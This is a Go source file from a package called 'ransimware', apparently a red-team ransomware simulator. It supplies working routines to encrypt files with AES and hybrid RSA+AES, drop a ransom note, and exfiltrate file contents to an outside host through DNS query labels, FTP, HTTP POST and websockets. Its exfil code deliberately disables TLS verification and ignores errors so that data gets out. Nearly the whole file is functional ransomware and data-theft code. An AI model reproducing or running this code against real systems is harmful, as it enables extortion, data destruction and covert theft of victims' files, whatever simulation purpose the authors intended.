package ransimware

import (
	"bytes"
	"crypto"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/tls"
	"encoding/base64"
	"encoding/hex"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	ws "github.com/gorilla/websocket"
	"github.com/mjwhitta/errors"
	"github.com/mjwhitta/ftp"
	"github.com/mjwhitta/inet"
)

var (
	// DefaultEncrypt is the default encryption behavior.
	DefaultEncrypt = func(path string, b []byte) ([]byte, error) {
		return b, nil
	}

	// DefaultExfil is the default exfil behavior.
	DefaultExfil = func(path string, b []byte) error {
		return nil
	}

	// DefaultNotify is the default notify behavior.
	DefaultNotify = func() error {
		return nil
	}
)

// AESDecrypt will return a function pointer to an EncryptFunc that
// actually decrypts using the specified password.
func AESDecrypt(passwd string) EncryptFunc {
	return func(_ string, b []byte) ([]byte, error) {
		var block cipher.Block
		var e error
		var iv [sha256.Size]byte = sha256.Sum256([]byte("redteam"))
		var key [sha256.Size]byte = sha256.Sum256([]byte(passwd))
		var stream cipher.Stream

		if len(b) < aes.BlockSize {
			return b, errors.New("ciphertext too short")
		}

		if block, e = aes.NewCipher(key[:]); e != nil {
			e = errors.Newf("failed to create AES cipher: %w", e)
			return b, e
		}

		// Ensure the file was encrypted with ransimware
		if !bytes.HasPrefix(b, iv[:aes.BlockSize]) {
			return b, nil
		}

		b = b[aes.BlockSize:]

		stream = cipher.NewCTR(block, iv[:aes.BlockSize])
		stream.XORKeyStream(b, b)

		return b, nil
	}
}

// AESEncrypt will return a function pointer to an EncryptFunc that
// uses the specified password.
func AESEncrypt(passwd string) EncryptFunc {
	return func(_ string, b []byte) ([]byte, error) {
		var block cipher.Block
		var ctxt []byte
		var e error
		var iv [sha256.Size]byte = sha256.Sum256([]byte("redteam"))
		var key [sha256.Size]byte = sha256.Sum256([]byte(passwd))
		var stream cipher.Stream

		if block, e = aes.NewCipher(key[:]); e != nil {
			e = errors.Newf("failed to create AES cipher: %w", e)
			return b, e
		}

		ctxt = make([]byte, aes.BlockSize+len(b))
		for i := range aes.BlockSize {
			ctxt[i] = iv[i]
		}

		stream = cipher.NewCTR(block, iv[:aes.BlockSize])
		stream.XORKeyStream(ctxt[aes.BlockSize:], b)

		return ctxt, nil
	}
}

// Base64Encode will "encrypt" using base64, obvs.
func Base64Encode(_ string, b []byte) ([]byte, error) {
	return []byte(base64.StdEncoding.EncodeToString(b)), nil
}

// DNSResolvedExfil will return a function pointer to an ExfilFunc
// that exfils by sending DNS queries to the authoritative nameserver
// for the specified domain.
func DNSResolvedExfil(domain string) ExfilFunc {
	return func(path string, b []byte) error {
		var b64 string
		var e error
		var label strings.Builder
		var labels []string
		var maxDNS int = 255 - len(domain) - 1 // From RFC
		var maxLabel int = 63                  // From RFC
		var req strings.Builder
		var reqs []string
		var special map[byte]string = map[byte]string{
			'+': "plus",
			'/': "slash",
			'=': "equal",
		}
		var stream *strings.Reader
		var tmp byte
		var uuid [4]byte

		// Get UUID
		if _, e = rand.Read(uuid[:]); e != nil {
			return errors.Newf("failed to read random data: %w", e)
		}

		// Base64 encode data
		if path != "" {
			b = append([]byte(path+"\n"), b...)
		}

		b64 = base64.StdEncoding.EncodeToString(b)
		stream = strings.NewReader(b64)

		// Create all labels
		for {
			// Read 1 byte at a time
			if tmp, e = stream.ReadByte(); e == io.EOF {
				break
			} else if e != nil {
				return errors.Newf("failed reading data: %w", e)
			}

			// Check for special chars
			if _, ok := special[tmp]; ok {
				if label.Len() > 0 {
					labels = append(labels, label.String())
					label.Reset()
				}

				labels = append(labels, special[tmp])

				continue
			}

			// Check label length
			if label.Len()+1 > maxLabel {
				labels = append(labels, label.String())
				label.Reset()
			}

			label.WriteByte(tmp)
		}

		if label.Len() > 0 {
			labels = append(labels, label.String())
			label.Reset()
		}

		// Create DNS requests
		req.WriteString(hex.EncodeToString(uuid[:]))

		for _, lbl := range labels {
			if req.Len()+len(lbl)+1 > maxDNS {
				req.WriteString("." + domain)
				reqs = append(reqs, req.String())
				req.Reset()
				req.WriteString(hex.EncodeToString(uuid[:]))
			}

			req.WriteString("." + lbl)
		}

		req.WriteString("." + domain)
		reqs = append(reqs, req.String())
		req.Reset()

		for _, fqdn := range reqs {
			// Ignore errors, just exfil
			_, _ = net.LookupIP(fqdn)
		}

		return nil
	}
}

// FTPExfil will return a function pointer to an ExfilFunc that
// exfils via an FTP connection.
func FTPExfil(dst, user, passwd string) (ExfilFunc, error) {
	var c *ftp.ServerConn
	var e error
	var f ExfilFunc
	var m *sync.Mutex = &sync.Mutex{}
	var secure bool

	// Remove leading protocol
	if strings.HasPrefix(dst, "ftp://") {
		dst = strings.Replace(dst, "ftp://", "", 1)
	} else if strings.HasPrefix(dst, "ftps://") {
		dst = strings.Replace(dst, "ftps://", "", 1)
		secure = true
	}

	// Connect to FTP server
	if !secure {
		//nolint:mnd // 5 secs
		c, e = ftp.Dial(dst, ftp.DialWithTimeout(5*time.Second))
	} else {
		// Skip verify in case user is using self-signed cert
		c, e = ftp.Dial(
			dst,
			//nolint:mnd // 5 secs
			ftp.DialWithTimeout(5*time.Second),
			ftp.DialWithExplicitTLS(
				//nolint:gosec // G402 - We want to ensure exfil, duh
				&tls.Config{InsecureSkipVerify: true},
			),
		)
	}

	if e != nil {
		return nil, errors.Newf("failed FTP connection: %w", e)
	}

	// Authenticate
	if e = c.Login(user, passwd); e != nil {
		return nil, errors.Newf("failed to login: %w", e)
	}

	f = func(path string, b []byte) error {
		if path == "" {
			path = "exfil"
		}

		// Fix slashes
		path = filepath.ToSlash(path)
		path = strings.TrimPrefix(path, "//")
		path = strings.TrimPrefix(path, "/")

		m.Lock()
		defer m.Unlock()

		// Make dirs
		_ = c.MakeDirRecur(filepath.Dir(path))

		// Ignore errors, just exfil
		_ = c.Stor(path, bytes.NewReader(b))

		return nil
	}

	return f, nil
}

// FTPParallelExfil will return a function pointer to an ExfilFunc
// that exfils via multiple FTP connections.
func FTPParallelExfil(dst, user, passwd string) (ExfilFunc, error) {
	var f ExfilFunc
	var secure bool

	// Remove leading protocol
	if strings.HasPrefix(dst, "ftp://") {
		dst = strings.Replace(dst, "ftp://", "", 1)
	} else if strings.HasPrefix(dst, "ftps://") {
		dst = strings.Replace(dst, "ftps://", "", 1)
		secure = true
	}

	f = func(path string, b []byte) error {
		var c *ftp.ServerConn
		var e error

		if path == "" {
			path = "exfil"
		}

		// Fix slashes
		path = filepath.ToSlash(path)
		path = strings.TrimPrefix(path, "//")
		path = strings.TrimPrefix(path, "/")

		// Connect to FTP server
		if !secure {
			//nolint:mnd // 5 secs
			c, e = ftp.Dial(dst, ftp.DialWithTimeout(5*time.Second))
		} else {
			// Skip verify in case user is using self-signed cert
			c, e = ftp.Dial(
				dst,
				//nolint:mnd // 5 secs
				ftp.DialWithTimeout(5*time.Second),
				//nolint:gosec // G402 - We want to ensure exfil, duh
				ftp.DialWithExplicitTLS(
					&tls.Config{InsecureSkipVerify: true},
				),
			)
		}

		if e != nil {
			return errors.Newf("failed FTP connection: %w", e)
		}

		// Authenticate
		if e = c.Login(user, passwd); e != nil {
			return errors.Newf("failed to login: %w", e)
		}

		// Make dirs
		_ = c.MakeDirRecur(filepath.Dir(path))

		// Ignore errors, just exfil
		_ = c.Stor(path, bytes.NewReader(b))

		return nil
	}

	return f, nil
}

// HTTPExfil will return a function pointer to an ExfilFunc that
// exfils via HTTP POST requests with the specified headers.
func HTTPExfil(dst string, headers map[string]string) ExfilFunc {
	return func(path string, b []byte) error {
		var b64 string
		var data []byte
		var e error
		var n int
		var req *http.Request
		var res *http.Response
		var stream *bytes.Reader = bytes.NewReader(b)
		var tmp [4 * 1024 * 1024]byte

		if t, ok := http.DefaultTransport.(*http.Transport); ok {
			if t.TLSClientConfig == nil {
				//nolint:gosec // G402 - Not a problem
				t.TLSClientConfig = &tls.Config{}
			}

			// We want to ensure exfil
			t.TLSClientConfig.InsecureSkipVerify = true
		}

		// Set timeout to 1 second
		inet.DefaultClient.SetTimeout(time.Second)

		for {
			if n, e = stream.Read(tmp[:]); (n == 0) && (e == io.EOF) {
				return nil
			} else if e != nil {
				return errors.Newf("failed to read data: %w", e)
			}

			// Create request body
			data = tmp[:n]
			if path != "" {
				data = append([]byte(path+"\n"), data...)
			}

			b64 = base64.StdEncoding.EncodeToString(data)

			// Create request
			req, e = http.NewRequest(
				http.MethodPost,
				dst,
				strings.NewReader(b64),
			)
			if e != nil {
				e = errors.Newf("failed to craft HTTP request: %w", e)
				return e
			}

			// Set headers
			for k, v := range headers {
				req.Header.Set(k, v)
			}

			// Ignore errors, just exfil
			res, _ = inet.DefaultClient.Do(req)
			_ = res.Body.Close()
		}
	}
}

// RansomNote will return a function pointer to a NotifyFunc that
// appends the specified text to the specified file.
func RansomNote(path string, text ...string) NotifyFunc {
	return func() (e error) {
		e = os.WriteFile(
			filepath.Clean(path),
			[]byte(strings.Join(text, "\n")),
			0o600, //nolint:mnd // u=rw,go=-
		)
		if e != nil {
			return errors.Newf("failed to write to %s: %w", path, e)
		}

		return nil
	}
}

// RSADecrypt will return a function pointer to an EncryptFunc that
// actually decrypts using the specified private key. The private key
// is used to decrypt an OTP used with AES for a hybrid RSA+AES
// scheme.
func RSADecrypt(priv *rsa.PrivateKey) EncryptFunc {
	return func(path string, b []byte) ([]byte, error) {
		var b64 []byte
		var ctxt []byte
		var e error
		var key []byte
		var n int
		var otp []byte
		var ptxt []byte

		// Ensure the file was encrypted with ransimware
		if !bytes.HasPrefix(b, []byte("ransimware")) {
			return b, nil
		}

		ctxt = b[10:]

		// Get key for AES decryption
		for i, c := range ctxt {
			if c == '\n' {
				b64 = ctxt[:i]
				ctxt = ctxt[i+1:]

				break
			}
		}

		// Base64 decode key
		key = make([]byte, base64.StdEncoding.DecodedLen(len(b64)))
		if n, e = base64.StdEncoding.Decode(key, b64); e != nil {
			return b, errors.Newf("failed to base64 decode: %w", e)
		}

		// RSA decrypt the OTP
		otp, e = priv.Decrypt(
			nil,
			key[:n],
			&rsa.OAEPOptions{Hash: crypto.SHA256},
		)
		if e != nil {
			return b, errors.Newf("failed to RSA decrypt OTP: %w", e)
		}

		// AES decrypt remaining contents using helper function
		if ptxt, e = AESDecrypt(string(otp))(path, ctxt); e != nil {
			return b, e
		}

		return ptxt, nil
	}
}

// RSAEncrypt will return a function pointer to an EncryptFunc that
// uses the specified public key. The public key is used to encrypt an
// OTP used with AES for a hybrid RSA+AES scheme.
func RSAEncrypt(pub *rsa.PublicKey) EncryptFunc {
	return func(path string, b []byte) ([]byte, error) {
		var b64 []byte
		var ctxt []byte
		var e error
		var final []byte
		var key []byte
		var otp [sha256.Size]byte

		// Generate random OTP for AES encryption
		if _, e = rand.Read(otp[:]); e != nil {
			return b, errors.Newf("failed to read random data: %w", e)
		}

		// RSA encrypt the OTP
		key, e = rsa.EncryptOAEP(
			sha256.New(),
			rand.Reader,
			pub,
			otp[:],
			nil,
		)
		if e != nil {
			return b, errors.Newf("failed to RSA encrypt OTP: %w", e)
		}

		// Base64 encode key
		b64 = make([]byte, base64.StdEncoding.EncodedLen(len(key)))
		base64.StdEncoding.Encode(b64, key)

		// AES encrypt using helper function
		if ctxt, e = AESEncrypt(string(otp[:]))(path, b); e != nil {
			return b, e
		}

		// Create hybrid structure
		final = []byte("ransimware")   // tag
		final = append(final, b64...)  // RSA encrypted key in base64
		final = append(final, '\n')    // separator
		final = append(final, ctxt...) // AES encrypted data

		return final, nil
	}
}

func wait(t time.Time, waitEvery, waitFor time.Duration) time.Time {
	if (waitEvery > 0) && (time.Since(t) >= waitEvery) {
		time.Sleep(waitFor)
		return time.Now()
	}

	return t
}

// WebsocketExfil will return a function pointer to an ExfilFunc that
// exfils via a websocket connection.
func WebsocketExfil(
	dst string,
	headers map[string]string,
	proxy ...string,
) (ExfilFunc, error) {
	var c *ws.Conn
	var dialer *ws.Dialer
	var e error
	var f ExfilFunc
	var hdrs http.Header
	var m *sync.Mutex = &sync.Mutex{}
	var res *http.Response
	var tmp *url.URL

	// Set headers
	for k, v := range headers {
		hdrs.Set(k, v)
	}

	// Skip verify in case user is using self-signed cert
	dialer = ws.DefaultDialer
	//nolint:gosec // G402 - We want to ensure exfil, duh
	dialer.TLSClientConfig = &tls.Config{InsecureSkipVerify: true}

	// Use proxy if provided
	if len(proxy) > 0 {
		if tmp, e = url.Parse(proxy[0]); e != nil {
			return nil, errors.Newf("failed to parse proxy: %w", e)
		}

		dialer.Proxy = http.ProxyURL(tmp)
	}

	// Connect to Websocket
	if c, res, e = dialer.Dial(dst, hdrs); e != nil {
		return nil, errors.Newf("failed Websocket connection: %w", e)
	}

	_ = res.Body.Close()

	f = func(path string, b []byte) error {
		var b64 string

		if path != "" {
			b = append([]byte(path+"\n"), b...)
		}

		b64 = base64.StdEncoding.EncodeToString(b)

		m.Lock()
		defer m.Unlock()

		// Ignore errors, just exfil
		_ = c.WriteMessage(ws.TextMessage, []byte(b64))

		return nil
	}

	return f, nil
}

// WebsocketParallelExfil will return a function pointer to an
// ExfilFunc that exfils via multiple websocket connections.
func WebsocketParallelExfil(
	dst string,
	headers map[string]string,
	proxy ...string,
) (ExfilFunc, error) {
	var dialer *ws.Dialer
	var e error
	var f ExfilFunc
	var hdrs http.Header
	var tmp *url.URL

	// Set headers
	for k, v := range headers {
		hdrs.Set(k, v)
	}

	// Skip verify in case user is using self-signed cert
	dialer = ws.DefaultDialer
	//nolint:gosec // G402 - We want to ensure exfil, duh
	dialer.TLSClientConfig = &tls.Config{InsecureSkipVerify: true}

	// Use proxy if provided
	if len(proxy) > 0 {
		if tmp, e = url.Parse(proxy[0]); e != nil {
			return nil, errors.Newf("failed to parse proxy: %w", e)
		}

		dialer.Proxy = http.ProxyURL(tmp)
	}

	f = func(path string, b []byte) error {
		var b64 string
		var c *ws.Conn
		var e error
		var res *http.Response

		// Connect to Websocket
		if c, res, e = dialer.Dial(dst, hdrs); e != nil {
			return errors.Newf("failed Websocket connection: %w", e)
		}
		defer func() {
			_ = c.WriteMessage(
				ws.CloseMessage,
				ws.FormatCloseMessage(ws.CloseNormalClosure, ""),
			)
			_ = c.Close()
		}()

		_ = res.Body.Close()

		if path != "" {
			b = append([]byte(path+"\n"), b...)
		}

		b64 = base64.StdEncoding.EncodeToString(b)

		// Ignore errors, just exfil
		_ = c.WriteMessage(ws.TextMessage, []byte(b64))

		return nil
	}

	return f, nil
}
